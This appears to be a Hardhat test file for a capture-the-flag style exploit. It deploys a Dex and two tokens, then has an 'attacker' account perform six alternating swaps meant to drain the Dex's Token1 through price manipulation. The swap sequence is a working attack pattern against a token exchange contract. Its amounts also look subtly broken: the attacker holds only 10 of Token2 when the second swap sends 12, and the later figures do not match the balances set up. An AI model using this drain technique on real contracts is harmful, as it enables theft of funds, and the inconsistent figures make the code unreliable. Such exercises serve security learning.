const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("DexExploit", function () {
  let Dex, SwappableToken, dex, token1, token2, owner, attacker;

  beforeEach(async () => {
    [owner, attacker] = await ethers.getSigners();

    // Deploy Dex contract
    const DexContract = await ethers.getContractFactory("Dex");
    dex = await DexContract.deploy();
    await dex.deployed();

    // Deploy Token 1
    const Token1 = await ethers.getContractFactory("SwappableToken");
    token1 = await Token1.deploy(dex.address, "Token1", "TK1", 1000000);
    await token1.deployed();

    // Deploy Token 2
    const Token2 = await ethers.getContractFactory("SwappableToken");
    token2 = await Token2.deploy(dex.address, "Token2", "TK2", 1000000);
    await token2.deployed();

    // Set tokens in the Dex contract
    await dex.setTokens(token1.address, token2.address);

    // Transfer 100 tokens of each to the Dex contract
    await token1.transfer(dex.address, 100);
    await token2.transfer(dex.address, 100);

    // Transfer 10 tokens of Token 1 to the attacker
    await token1.transfer(attacker.address, 10);

    // Approve Dex to spend attacker's tokens
    await token1.connect(attacker).approve(dex.address, 1000);
    await token2.connect(attacker).approve(dex.address, 1000);
  });

  it("Should drain all of Dex Token 1", async () => {
    await dex.connect(attacker).swap(token1.address, token2.address, 10);
    await dex.connect(attacker).swap(token2.address, token1.address, 12);
    await dex.connect(attacker).swap(token1.address, token2.address, 24);
    await dex.connect(attacker).swap(token2.address, token1.address, 30);
    await dex.connect(attacker).swap(token1.address, token2.address, 41);
    await dex.connect(attacker).swap(token2.address, token1.address, 65);

    const dexToken1Balance = await token1.balanceOf(dex.address);
    expect(dexToken1Balance).to.equal(0);
  });
});